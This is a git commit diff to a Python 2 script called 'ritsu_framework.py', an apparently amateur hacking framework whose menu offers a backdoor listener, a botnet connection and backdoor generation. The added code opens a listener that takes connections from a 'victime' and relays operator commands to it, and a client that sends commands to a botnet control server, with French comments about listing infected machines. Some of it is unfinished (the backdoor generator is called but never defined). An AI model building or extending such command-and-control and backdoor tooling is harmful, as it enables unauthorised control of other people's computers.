27e54c71d5a491244871d6f8dbb1786f677190ca
Exca_Cracksec <excaling@hotmail.fr>
2017-04-06 23:58:08 +0200

    Update ritsu_framework.py

--- ritsu_framework.py
+++ ritsu_framework.py
@@ -2,38 +2,34 @@ import socket
 import sys
 import threading
 
-#version non testable, simplement pour but de montrer l'avancer du projet
-#toute les instruction pass veulent dire que c'est en developpement
 
-
-
-def listen:
-	host = socket.gethostbyname(socket.gethostname())
-	port = 443 #you can modify it
+def listenbackdoor():
 	listening = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	host = raw_input('your ip address please: ')
+	port = input('your port: ') 
 	listening.bind((host, port))
+	print "listening on address: " + str(host) + "on port: " + str(port)
 	while True:
+		listening.listen(5)
 		(victime, (address, his_port)) = listening.accept()
-		print address
-		interact = raw_input('Ritsu_:')
-		victime.send(interact)
-		data = victime.recv(1024)
-		print data
+		print "victime: " + address
+		while True:
+			interact = raw_input('Ritsu_>:')
+			victime.send(interact)
+			data = victime.recv(1024)
+			print str(data) #je dois integrer plusieurs fonction à la backdoor
 
-def connectto_b0tnet:
+def connectto_b0tnet(): #pas encore au point mais j'y travaille
 	host = socket.gethostbyname(socket.gethostname()) 
-	port 443
+	port = 443
 	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
 		server = raw_input('enter the server ip')
 		server_port = input("enter the server's port please :3!!!")
-	connection.connect((server, server_port))
+		connection.connect((server, server_port))
 	except:
 		print 'ip and port not available please retry bye ;) '
 	while True:
-		#donc notre commande au server comme liste les machines infected
-		#si par exemple notre commande que l'on envoie correspond par exemple à liste
-		#le server reçoit et reconnait la commande liste et vous envoie la liste des machine infecté
 		
 		interaction = raw_input('Ritsu_b0tnet_>:')
 		if interaction != "":
@@ -44,7 +40,6 @@ def connectto_b0tnet:
 			connection.send(interaction)
 			data = connection.recv(1024)
 			print data
-		#j'ai mis deux conditio car pour l'instant je ne sais pas encore sous quelle forme on va recupérer les addresses ip va falloir que je fasse un peu de recherches
 		elif interaction == "exit":
 			connection.close()
 print('__________ .__   __                  ')
@@ -62,9 +57,8 @@ print '3) generate backdoor'
 command  = input('your task?')
 
 if command == 1:
-	listen()
+	listenbackdoor()
 elif command == 2:
 	connectto_b0tnet()
 elif command == 3:
-	pass
-	
+	generate_backdoor()
